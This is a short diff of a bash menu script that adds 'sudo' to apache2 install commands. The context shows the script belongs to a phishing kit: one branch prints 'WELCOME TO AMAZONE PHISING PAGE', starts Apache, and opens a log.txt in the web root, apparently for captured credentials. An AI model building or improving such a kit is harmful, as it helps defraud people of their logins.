@@ -40,7 +40,7 @@ case $Choice in
 		 echo -e $yellow "Enter your option"
 		 read option
 		 case $option in 
-			 1) apt-get install apache2
+			 1) sudo apt-get install apache2
 		            hostnamectl
 		systemctl start apache2
 		systemctl restart apache2.service
@@ -65,7 +65,7 @@ case $Choice in
 		cd /var/www/html/
 		gedit log.txt
 		;;
-	        2) apt-get install apache2
+	        2) sudo apt-get install apache2
 		hostnamectl
 		systemctl start apache2
 		systemctl restart apache2.service
@@ -91,7 +91,7 @@ case $Choice in
                 esac
                 ;;
 	2)printf "                                                      \e[201m\e[1;33m :: WELCOME TO AMAZONE PHISING PAGE :: \e[0m\n"
-		apt-get install apache2
+		sudo apt-get install apache2
 		hostnamectl
 		systemctl start apache2
 		systemctl restart apache2.service
